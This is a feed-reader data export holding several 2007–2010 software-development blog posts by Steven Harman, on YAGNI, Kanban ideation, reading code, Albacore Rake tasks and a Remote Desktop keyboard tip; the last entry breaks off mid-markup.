{"_id":927,"_uid":927,"_dt":1373729346608,"_s":"8f92d25a58ddf39fcd384ffc531ba20a"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/why-dont-we-ask-why","title":"Why Don't We Ask Why?","published":{"$wrap":"$date","v":1266497880000,"h":"2010-02-18T12:58:00.000Z"},"starred":false,"read":false,"content":"<p>Have you ever thought about just how much time we software folk spendfocused on the technologies we’re using, on implementation minutia,and on all of the shiny new<em>solutions</em>we<em>should</em>be using?</p><p><a href=\"http://www.flickr.com/photos/marcobellucci/3534516458/\" title=\"photo via: http://www.flickr.com/photos/marcobellucci/3534516458/\"><img class=\"right\" src=\"http://stevenharman.net/images/posts/question-mark.jpg\"></a></p><p>Now contrast that with how often we stop to think about the<strong>Whys</strong>?</p><p>Why are we being asked to solve<em>fizz-buzz-thing</em>; do we understand themotivation and context behind the problem, or are we fixated on howwe’ll build the solution? Are we asking why a problem occurred, or arewe merely focused on how we fixed it, this time?</p><h3>Why don’t we ask“Why?”</h3><p>Frankly, because we’d rather spend our time in the comfortable arenaof<strong>how</strong>than venture into the sometimes uneasy realm of<strong>why</strong>.</p><blockquote><p>She didn’t want to know how a thing was done, but why. That can be<br/>embarrassing. You ask *Why* to a lot of things and you wind up<br/>very unhappy indeed, if you keep at it.<br/>- Captain Beatty</p><footer><strong>Ray Bradburry</strong><cite><a href='http://www.amazon.com/dp/0345342968/?tag=stevenharman-20'>Fahrenheit 451</a></cite></footer></blockquote><!-- more --><p>Asking why often forces us to face the truth, and that truth can beuncomfortable. We need to have the courage to face those truths andconinue to ask why; we must have the<a href=\"http://en.wikipedia.org/wiki/Extreme_Programming#Values\" title=\"XP Values - Courage\">courage</a>to pop the why stack.</p><p>It’s only by asking why that we’ll gain the understanding, insight,and context necessary to effectively solve the problems we’re facedwith, to grow, and to improve.</p><p>So,<em>why</em>are you reading this post? :)</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=L-DGmnBsy-Y:tHFiVLL6CLU:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=L-DGmnBsy-Y:tHFiVLL6CLU:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=L-DGmnBsy-Y:tHFiVLL6CLU:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=L-DGmnBsy-Y:tHFiVLL6CLU:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=L-DGmnBsy-Y:tHFiVLL6CLU:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=L-DGmnBsy-Y:tHFiVLL6CLU:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/L-DGmnBsy-Y\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":927}}
{"k":"0000000082","o":"0000003425","v":"001"}
{"_id":928,"_uid":928,"_dt":1373729346611,"_s":"b42943c454b6b352f8e0c0b656c28101"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/yagni-aint-what-you-think-it-is","title":"YAGNI Ain't What You Think It Is","published":{"$wrap":"$date","v":1262871180000,"h":"2010-01-07T13:33:00.000Z"},"starred":false,"read":false,"content":"<p>In the software development vernacular the term<acronym title=\"Youaren't gonna need it\">YAGNI</acronym>is often used as a device to putdown attempts at prematurely adding functionality - things which areonly speculatively required. This makes sense given that is basicallythe<a href=\"http://www.xprogramming.com/Practices/PracNotNeed.html\" title=\"You're NOT gonna need it\">definition</a>that<a href=\"http://www.xprogramming.com/\" title=\"XProgramming : an Agile Software Development Resource\">Ron Jeffries</a>and our<acronymtitle=\"eXtreme Programming\">XP</acronym>forefathers came up with solong ago.</p><h3>Is that the whole story?</h3><p><a href=\"http://www.flickr.com/photos/z6p6tist6/501709581/\" title=\"photo via: http://www.flickr.com/photos/z6p6tist6/501709581/\"><img class=\"right\" src=\"http://stevenharman.net/images/posts/stop-sign.jpg\"></a>In short, I don’t thinkso.</p><p>I’ve long believed there was more to YAGNI than what had beencanonically defined and was commonly understood. However, until recentlyI was never able to put my finger on what was missing.</p><p>While listening to an episode of<a href=\"http://www.cincomsmalltalk.com/blog/blogView?showComments=true&printTitle=Industry_Misinterpretations_164:_Going_for_the_Longball&entry=3436948975\" title=\"Industry Misinterpretations 164: Going for the Longball\">Industry Misinterpretations</a>I heard<a href=\"http://www.threeriversinstitute.org/Kent%20Beck.htm\" title=\"Kent Beck @ Three Rivers Institute\">KentBeck</a>make a subtle point about the need to make progress being moreimportant than the completeness of the thing you’re building at the pointyou’re building it. Lending from Kent’s insight and mixing in much of my ownexperience, I realized YAGNI is not about delaying building things until youneed them; it’s that gaining real experience in the problem domain, whilemaking concrete progress, is more important than trying to achieve a completesolution<em>right now</em>.</p><p>Do you think it’s too early to update the<a href=\"http://en.wikipedia.org/wiki/You_ain't_gonna_need_it\" title=\"You ain't gonna need it\">Wikipedia article</a>?</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=A3Q9Sulh--E:NBsYUyh_FCI:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=A3Q9Sulh--E:NBsYUyh_FCI:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=A3Q9Sulh--E:NBsYUyh_FCI:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=A3Q9Sulh--E:NBsYUyh_FCI:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=A3Q9Sulh--E:NBsYUyh_FCI:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=A3Q9Sulh--E:NBsYUyh_FCI:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/A3Q9Sulh--E\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":928}}
{"k":"0000000082","o":"0000004224","v":"001"}
{"_id":929,"_uid":929,"_dt":1373729346614,"_s":"ce24ad4b67156b76537ee8b0c29560d0"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/gain-new-insights-by-visualizing-what-youve-already-got","title":"Gain New Insights by Visualizing What You’ve Already Got","published":{"$wrap":"$date","v":1267050720000,"h":"2010-02-24T22:32:00.000Z"},"starred":false,"read":false,"content":"<p>I don’t know about you, but I like pretty things. Things that engage me. Shiny things. I enjoy seeing<em>the same old thing</em>in new and interesting ways. I suppose I’m just a visual kinda’ guy.</p><p>Unfortunately, the desire for visual representation is at odds with the high bandwidth flood of information we’re subjected to these days. Even if we manage to trim the overwhelming flood of information down to a laser-focused stream, it still takes an immense amount of effort to make sense of it.</p><h3>For example</h3><p>For years the primary way we’ve looked at the activity or interaction within various source control management systems is via log files. Yep… plain, text-laden, indecipherable logs chock full of entries each a similitude of it’s predecessors.</p><object width=\"560\" height=\"315\"><param name=\"movie\" value=\"http://www.youtube.com/v/S_mMKXFaLaE?version=3&hl=en_US&rel=0\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://www.youtube.com/v/S_mMKXFaLaE?version=3&hl=en_US&rel=0\" type=\"application/x-shockwave-flash\" width=\"560\" height=\"315\" allowscriptaccess=\"always\" allowfullscreen=\"true\"></embed></object><!-- more --><p>However, thanks to projects like<a title=\"Processing\" href=\"http://processing.org/\" rel=\"external\">Processing</a>there may be a change on the horizon. Using tools of their ilk we can build exciting new ways to<em>see</em>and consume the vast seas of data we’re drowning in. By visualizing the data we are able to discover new and interesting patterns, behaviors, and insights.</p><h3>An example</h3><p>The video to the right is an example of one such visualization I produced using<a title=\"Gource - software version control visualization\" href=\"http://code.google.com/p/gource/\" rel=\"external\">Gource</a>to analyze the Git repository of one of the product’s we’ve build at<a title=\"VersionOne: Simplifying Software Delivery\" href=\"http://versionone.com/\" rel=\"external\">VersionOne</a>.</p><p>For reference, each branch (line) is a different directory containing files. Each leaf (dot) is a file, and different file types (Ruby, JavaScript, C#, etc.) have different colors. Each contributor is represented by their name and Gravatar.  The colored lines that occasionally connect a contributor to a file are color coded to represent adds (green), changes (orange) and deletes (red).</p><p>A few interesting things this visualization leads me to think about are</p><ul><li>how much churn happens in various parts of the code base?</li><li>where are we spending time?</li><li>is new-feature work well isolated? (perhaps an indicator of composition)</li><li>are there<em>specialists</em>within the team?</li></ul><p>Do any interesting things pop to mind when you watch the video? Let me know by leaving a comment.</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=3c0wmdEjSLU:xb-kLb6__P4:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=3c0wmdEjSLU:xb-kLb6__P4:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=3c0wmdEjSLU:xb-kLb6__P4:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=3c0wmdEjSLU:xb-kLb6__P4:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=3c0wmdEjSLU:xb-kLb6__P4:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=3c0wmdEjSLU:xb-kLb6__P4:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/3c0wmdEjSLU\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":929}}
{"k":"0000000082","o":"0000005250","v":"001"}
{"_id":930,"_uid":930,"_dt":1373729346617,"_s":"5f5f3e78701779fcc138e0098ffc2887"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/reading-code-is-key-to-writing-good-code","title":"Reading Code is Key to Writing Good Code","published":{"$wrap":"$date","v":1258553160000,"h":"2009-11-18T14:06:00.000Z"},"starred":false,"read":false,"content":"<p>As humans we seem to have an innate desire for structure in our lives. Structure permeates through our societies; it’s found within our families, education systems, governments, etc. I suppose it’s no surprise then that we also seek to<em>force</em>structure upon the work that we, as software developers, do.</p><p>The problem is the work we do isn’t structured. It is not deterministic. There is no grand blue print, process, nor methodology that we can follow to pay dirt.</p><p>We live in a chaotic and complex world that is itself continuously changing and adapting.</p><p>Software product development is a creative activity taking place in the midst of that complex and adaptive world. So doesn’t it make sense that we, as software developers, might benefit from admitting that we are indeed doing creative, unstructured, adaptive work?<em>I sure think so!</em></p><!-- more --><h3>Looking outward for inspiration</h3><p>I’ve recently been looking outward to other creative professions and trades for inspiration and insights into how they work. One thing I’ve realized is that those folks spend an immense amount of time studying and seeking inspiration from the work of others both within and outside their own field.</p><p>For example, a musician doesn’t just sit in his garage all day, banging out albums. He listens to and is influenced by the music of many other musicians. An author doesn’t simply site down and write manuscript after manuscript. She spends countless hours reading the classics, studying the words, flow, and style of other authors. The same thing goes for painters, actors, architects, etc. And all of these people are constantly immersing them selves in works outside their area; musicians reading Hemingway, singer/song writers studying Salvador Dali, painters listening to Mozart, cats and dogs living together…</p><p>How arrogant of we programmers then to think that we won’t, or don’t, benefit from reading code written by -<em>gasp</em>- someone else!</p><h3>Read, learn, and be inspired</h3><p><img class=\"right\" src=\"http://stevenharman.net/images/posts/text.jpg\" title=\"Yay for reading!\">In my experience we spend a great deal more time reading code than actually<em>writing</em>it. Whether it be the code you wrote just a few minutes ago or something you’ve inherited and are now maintaining, you’re reading it. Of course, that’s only considering the motive of reading code because you’re currently working with.</p><p>The greatest motivator for reading code is the opportunity it provides for learning and serving as a source of inspiration. Reading code exposes you to techniques, view points, styles, idioms, and algorithms that you may not have otherwise come across.</p><p>In my own career it was by reading code written in Ruby that I first started to develop an appreciation for beauty and aesthetics in code. It also opened me to new ways of thinking about problems and exposed many pains and frictions with the techniques I had been using to that point.</p><h3>Where to start?</h3><p>I realize it’s probably obvious, but I’m going to say it anyhow - a great way to start reading other’s code is to pull down an Open Source project and dive in. Of course, that’s not to say that all Open Source code bases are necessarily examples of great code’ so you might also want to leverage your network to find examples. Or, use your Google-fu to see what others are reading. Or maybe check out:</p><ul><li><a href=\"http://katas.softwarecraftsmanship.org/\" title=\"Software Craftsmanship - Katas\">Katacasts</a>by<a title=\"Corey Haines\" href=\"http://www.coreyhaines.com/\" rel=\"friend met\">Corey Haines</a>and Chris Parsons</li><li><a href=\"http://www.hanselman.com/blog/CategoryView.aspx?category=Source+Code\">The Weekly Source Code</a>series by<a title=\"Scott Hanselman's Computer Zen\" href=\"http://www.hanselman.com\" rel=\"colleague met\">Scott Hanselman</a></li></ul><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=0wBN1CsmF1s:glKOe2aU6JQ:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=0wBN1CsmF1s:glKOe2aU6JQ:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=0wBN1CsmF1s:glKOe2aU6JQ:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=0wBN1CsmF1s:glKOe2aU6JQ:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=0wBN1CsmF1s:glKOe2aU6JQ:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=0wBN1CsmF1s:glKOe2aU6JQ:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/0wBN1CsmF1s\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":930}}
{"k":"0000000082","o":"0000007903","v":"001"}
{"_id":931,"_uid":931,"_dt":1373729346623,"_s":"82f9e27f43dd77abf86552abab026ea3"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/a-sketch-ideation-pipeline","title":"A Sketch of our Ideation Pipeline","published":{"$wrap":"$date","v":1232450160000,"h":"2009-01-20T11:16:00.000Z"},"starred":false,"read":false,"content":"<p><a href=\"http://stevenharman.net/images/posts/a-sketch-ideation-pipeline.png\"><img class=\"thumbnail left\" src=\"http://stevenharman.net/images/posts/a-sketch-ideation-pipeline.png\" width=\"300\" title=\"\"Initial sketch of our Ideation Pipeline\"\" alt=\"\"Initial sketch of our Ideation Pipeline\"\"></a></p><p>This is an initial sketch of an<em>Ideation Pipeline</em>my team will be using tohelp drive the direction of a product we’re working on. The sketch is based ona discussion we had about how we currently get from an idea to delivering onthat idea, and how we’d like to do that going forward.</p><p>While we probably should have done a full on<a href=\"http://en.wikipedia.org/wiki/Value_Stream_Mapping\" title=\"Value Stream Mapping\">Value Stream Map</a>, we didn’t.And the only excuse I have is that we’re kicking this product off so thereisn’t really a set way we do things… not yet anyhow.</p><p>At any rate, later today I’ll be turning this loose sketch into a physical<a href=\"http://en.wikipedia.org/wiki/Kanban\" title=\"Kanban\">Kanban</a>board that we’ll used to track and pull ideas through our ideationprocess, and feed the resulting features into our development process.</p><p>But first, I want to explain how the whole thing will work, or at least howwe’re going to start – I’m sure we’ll tweak some things, and change out wholeparts of this process as we go along. Let’s get started.</p><!-- more --><h3>Starting with an Idea</h3><p>Our process starts with an idea. An idea can be nearly anything that someone<em>thinks</em>will add value to the system. An idea might be laser-focused, or itmight be more nebulous. At this stage we don’t really care, it’s onlyimportant that we realize we have a potential value-adding idea and that we actupon it.</p><p>The Standardized Work (designated by the blue text in the lower box of eachstage) in this stage is pretty basic, though not necessarily easy. In essence,an idea needs to be evaluated to determine it will deliver value.</p><p>And what does<em>deliver value</em>mean?</p><blockquote><p><strong>Value is…</strong></p><p>Seen though the eyes of those who pay for, use, and derive value from the systems we create.</p></blockquote><p>There are many factors that go into determining if something is or is notvaluable. In our case it’s things like market demand, product vision androadmap, feature parity with competitors, availability of resources, effort,etc… Also, value is a temporal thing. So while an idea might not hold muchpromise for delivering value now, that doesn’t mean that it won’t at some pointin the future.</p><p>If it’s determined that an idea will deliver value now, the idea card is movedinto the Ready for Decomposition state. However, if the idea won’t delivervalue now (or at least within the very short, foreseeable future), it’s movedto a<em>Never</em>state. In the physical world that means the Idea Kanban is takenoff the board.</p><p><em>But wait… if the idea has potential to provide value in the future, and you’vemoved it to Never, won’t we lose track of it?</em></p><p><strong>YES, exactly!</strong>And you know what? We don’t care! If the idea truly haspotential for some future value, it will come back into our pipeline on itsown. Why waste time, effort, and money keeping track of a huge backlog of stuffthat might not ever happen?<a href=\"http://arcware.net/dmzing-the-backlog/\" title=\"DMZing the Backlog\">DMZ that stuff</a>.</p><h3>Ready for Decomposition</h3><p>Right now we have no queue limits on our Ready for Decomposition queue becausewe’re</p><ul><li>thinking our throughput will be high enough to keep the queue short anyhow</li><li>going to help our customers be honest with themselves and diligent indetermining which ideas really will provide value</li></ul><p>However, if we find this queue to be a bottleneck, or a source of thrashing,we’ll likely put a limit on it.</p><p>The first thing that needs to happen when any idea enters the Ready forDecomposition state is to re-prioritize the queue. This needs to happen so theteam knows which ideas are most important and should be decomposed first.</p><p>Decomposing an idea means doing necessary analysis activities to understand andflesh-out the idea, break it down into one or more Minimum MarketableFeature (MMF), and defining acceptance criteria (in a loose<a href=\"http://stevenharman.net/toward-a-better-use-of-context-specification\" title=\"Towared a Better Use of Context/Specification\">Context/Specification</a>style) for each feature. During thedecomposition the MMFs are transitioned to physical Kanbans that will feed intoand flow through our development pipeline. These are also known as FeatureCards within our organization.</p><h3>When to decompose?</h3><p>Idea decomposition is not a regularly scheduled activity, but is triggered by adownstream need for Feature Cards. That is, ideas are<em>pulled</em>through theIdeation Pipeline by some downstream activity that will move the idea closer toproviding value. We’re pulling from<a href=\"http://www.amazon.com/dp/0321437381/?tag=stevenharman-20\" title=\"Implementing Lean Software Development: From Concept to Cash\">Concept to Cash</a>.</p><p>It should also be noted that we only decompose as many ideas as are needed tosatisfy the source of the pull. In this case, that would be our developmentpipeline’s backlog queue. If the backlog has two spots open, and we decomposean idea into two MMFs, then we’re done decomposing for now. If we onlydecompose it into one MMF, then we’ll need to decompose another idea.</p><p>And what if that second idea decomposes into two or more MMFs? Now we’ve gotmore MMFs than we can fit in our backlog… oh no!</p><p>Actually, that’s just fine. Our development backlog is itself a prioritizedqueue. So we just need to prioritize all of the MMFs, fill the backlog with themost important ones, and let the rest sit in the Decomposed state until thebacklog pulls another one in.</p><h3>On to the development pipeline.</h3><p>Well… that’s what those MMF Kanbans would do anyhow. But you, dear reader, willhave to wait until later – like until I write a post that covers ourdevelopment pipeline.</p><h3>Other Resources</h3><p>If you’re looking for more information on some of the terms or concepts I’vementioned here, be sure to check out Karl Scotland’s excellent round-up oflinks/references to materials on<a href=\"http://availagility.wordpress.com/kanban/\" title=\"Useful links or references to material on Kanban Software Development.\">Kanban Software Development</a>.</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=KYv-eCh92uM:kVV5Bs6fE0s:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=KYv-eCh92uM:kVV5Bs6fE0s:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=KYv-eCh92uM:kVV5Bs6fE0s:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=KYv-eCh92uM:kVV5Bs6fE0s:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=KYv-eCh92uM:kVV5Bs6fE0s:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=KYv-eCh92uM:kVV5Bs6fE0s:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/KYv-eCh92uM\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":931}}
{"k":"0000000082","o":"0000006052","v":"001"}
{"_id":932,"_uid":932,"_dt":1373729346628,"_s":"7264c24110a7ef67f4b0b3f574812f6c"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/omg-better-rake-for-dot-net","title":"OMG, Better Rake (for .net)!","published":{"$wrap":"$date","v":1258984680000,"h":"2009-11-23T13:58:00.000Z"},"starred":false,"read":false,"content":"<p>If you ask me, when it comes tools for writing automated build scriptsnothing packs more bang for the buck than<a href=\"http://rake.rubyforge.org/\" title=\"Rake - Ruby Make\">Rake</a>. Until recently,using Rake to build .net solutions required a magic concoction of hackedtogether scripts which rarely exhibited Ruby’s appreciation for beautynor Rake’s spirit of simplicity.</p><p>Luckily our buddy<a rel=\"met friend\"href=\"http://www.lostechies.com/blogs/derickbailey/\" title=\"DerickBailey's blog\">Derick Bailey</a>decided it was time to bite the bulletand start building some<em><a href=\"http://www.lostechies.com/blogs/derickbailey/archive/2009/09/17/how-a-net-developer-hacked-out-a-rake-task.aspx\" title=\"How A .NET Developer Hacked Out a Rake Task\">real Rake tasks</a></em>that were special suitedfor building .net code. The result is<a href=\"http://github.com/derickbailey/Albacore\" title=\"Albacore: A Suite Of Rake Build Tasks For .NET Solutions\">Albacore</a>.</p><!-- more --><h3>Using Rake for .net<acronym title=\"In Real Life\">IRL</acronym></h3><p>I’ve been using Rake to<a href=\"http://stevenharman.net/blog/archive/2009/05/29/being-lazy-with-rake.aspx\" title=\"Being Lazy with Rake\">be lazy</a>for a while. And we, the<a href=\"http://versionone.com/\" title=\"VersionOne: Simplifying Software Delivery\">VersionOne</a>dudes& dudettes, have been using it to help automateour<acronym title=\"Continuous Integration\">CI</acronym>builds for overa year now. And just last week we started ditching much of ourhacky-Rake-script inventory in favor of more concise, tested, andreadable Rake tasks via Albacore.</p><p>During the migration I’ve run into a few small hitches here and there,but nothing that I couldn’t track down, write a test for, and fixwithin a couple of<a href=\"http://www.infoq.com/news/2009/09/Pomodoro\" title=\"Pomodoro - An Agile Approach to Time Management\">tomatoes</a>. In one case I discovered an issue,called Derick to confirm, suggested a fix, and had a new Albacore Gempublished within a couple of hours.<em>Hawt!</em></p><p>Albacore already has a decent number of tasks baked in, and the list isgrowing all the time!</p><ul><li><a href=\"http://wiki.github.com/derickbailey/Albacore/assemblyinfotask\">AssemblyInfoTask</a>- Generate an AssemblyInfo.cs file.Currently only supports C#</li><li><a href=\"http://wiki.github.com/derickbailey/Albacore/expandtemplatestask\">ExpandTemplatesTask</a>- expand template files with #{setting}markers, using YAML configuration files as the data</li><li><a href=\"http://wiki.github.com/derickbailey/Albacore/ncoverconsoletask\">NCoverConsoleTask</a>- Run code coverage analysis through NCover’s<code>NCover.Console</code></li><li><a href=\"http://wiki.github.com/derickbailey/Albacore/ncoverreporttask\">NCoverReportTask</a>- Check code coverage and get detailedreports through NCover’s<code>NCover.Reporting</code></li><li>NUnitTask - run NUnit test suites</li><li><a href=\"http://wiki.github.com/derickbailey/Albacore/msbuildtask\">MSBuildTask</a>- Build a Visual Studio solution (<code>.sln</code>) orMSBuild file</li><li><a href=\"http://wiki.github.com/derickbailey/Albacore/renametask\">Rename Task</a>- Rename a file</li><li><a href=\"http://wiki.github.com/derickbailey/Albacore/sftptask\">SftpTask</a>- Upload a file to a remote server via secure FTPconnection</li><li><a href=\"http://wiki.github.com/derickbailey/Albacore/sqlcmdtask\">SQLCmdTask</a>- Run scripts and other commands through SQLServer’s<code>sqlcmd.exe</code></li><li><a href=\"http://wiki.github.com/derickbailey/Albacore/sshtask\">SshTask</a>- Run a command on a remote system via a secureshell connection</li><li><a href=\"http://wiki.github.com/derickbailey/Albacore/ziptask\">ZipTask</a>- Package your build artifacts into a .zip foreasier distribution source data</li></ul><h3>Contribute!</h3><p>As we move more and more of our custom stuff over I’ll continue to addfeatures to Albacore, enhancing the great work the core team is doing.In fact, I’m already planning a<a href=\"http://github.com/derickbailey/Albacore/issues/#issue/27\" title=\"Albacore::NAntTask - for migrating to Rake\">NAnt task</a>to help those folks inthe process of migrating from an existing NAnt-based build script toRake. Look for it soon!</p><h3>Resources</h3><ul><li><a href=\"http://github.com/derickbailey/Albacore\" title=\"Albacore: A Suite of Rake Build Tasks For .Net Solutions\">Albacore on GitHub</a></li><li><a href=\"http://wiki.github.com/derickbailey/Albacore\" title=\"Albacore Wiki\">Albacore Wiki</a></li><li><a href=\"http://codebetter.com/blogs/david_laribee/archive/2008/08/25/omg-rake.aspx\" title=\"OMG Rake!\">OMG Rake!</a>- The original post which first inspired many touse Rake with .net</li></ul><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=nDT6tpRa5Ac:S2sNJwPRs9c:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=nDT6tpRa5Ac:S2sNJwPRs9c:cGdyc7Q-1BI\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=cGdyc7Q-1BI\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=nDT6tpRa5Ac:S2sNJwPRs9c:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=nDT6tpRa5Ac:S2sNJwPRs9c:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=nDT6tpRa5Ac:S2sNJwPRs9c:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?i=nDT6tpRa5Ac:S2sNJwPRs9c:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/stevenharman/~4/nDT6tpRa5Ac\" height=\"1\" width=\"1\"/>","author":false,"_id":{"$wrap":"$oid","v":932}}
{"k":"0000000082","o":"0000003402","v":"001"}
{"_id":933,"_uid":933,"_dt":1373729346632,"_s":"b3255ef9c0927d0f807f7cebae115dcb"}
{"subscription":{"$wrap":"$oid","v":40},"link":"http://stevenharman.net/how-to-ctrl--alt--del-in-remote-desktop","title":"How-To: Ctrl + Alt + Del in Remote Desktop","published":{"$wrap":"$date","v":1188389460000,"h":"2007-08-29T12:11:00.000Z"},"starred":false,"read":false,"content":"<p>I’m a fan of<a href=\"http://en.wikipedia.org/wiki/Remote_Desktop_Protocol\" title=\"Remote Desktop Protocol\">Microsoft’s Remote Desktop</a>; it’s built intoWindows and allows me to quickly and easily administer a remote box fromthe comfort of my own work station. I use it at my house to administerthe headless servers on my home network, the<a href=\"http://subtextproject.com\" title=\"Subtext Project\">Subtext</a>buildserver, and the co-located<a href=\"http://veloc-it.com\" title=\"VelocIT - We Deliver IT\">VelocIT</a>servers.</p><h3>Gotta’ love that magic!</h3><p><img class=\"left\" src=\"http://stevenharman.net/images/posts/virtual-pc-ctrl-alt-del.png\" title=\"\"Ctrl + Alt + Del in Virtual PC\"\" alt=\"\"Ctrl + Alt + Del in Virtual PC\"\"></p><p>Today a<a href=\"http://www.micahdylan.com/\" title=\"Micah Dylan\">co-worker</a>asked me how to send the infamous<code>Control + Alt +Delete</code>keystroke combination to a machine he was working on via<abbrtitle=\"Remote Display (or Desktop) Protocol\">RDP</abbr>. This is a prettycommon keystroke to use when trying administer windows… it does have uses otherthan just killing the box.</p><p>With<a href=\"http://www.microsoft.com/windows/products/winfamily/virtualpc/\" title=\"Microsoft Virtual PC\">Virtual PC</a>there is menu item to send the keystrokes on to thevirtual box. Go to the<em>Action</em>menu and select the<code>Ctrl + Alt + Del</code>option.</p><h3>And with Remote Desktop?</h3><p><img class=\"right\" src=\"http://stevenharman.net/images/posts/ctrl-alt-del.gif\" title=\"\"The only keyboard you'll ever need\"\" alt=\"\"The only keyboard you'll ever need\"\"></p><p>Well it’s not quite as obvious. Actually it’s not an obvious solution at all…hell it might not even be documented!</p><p><em>For the record, since I already knew the answer I decided to be lazyand didn’t bother to search the tubes for any official documentation.</em></p><p>To send the<code>Ctrl + Alt + Del</code>keystroke combination via RDP you actually needto use…</p><p><code>Ctrl + Alt + End</code></p><p>WTF?<em>That</em>sure is intuitive!</p><div class=\"feedflare\"><a href=\"http://feeds.stevenharman.net/~ff/stevenharman?a=mjVxzIXjLvc:M25RZT6xlww:G79ilh31hkQ\"><img src=\"http://feeds.feedburner.com/~ff/stevenharman?d=G79ilh31hkQ\" border=\"0\"></img></a><a 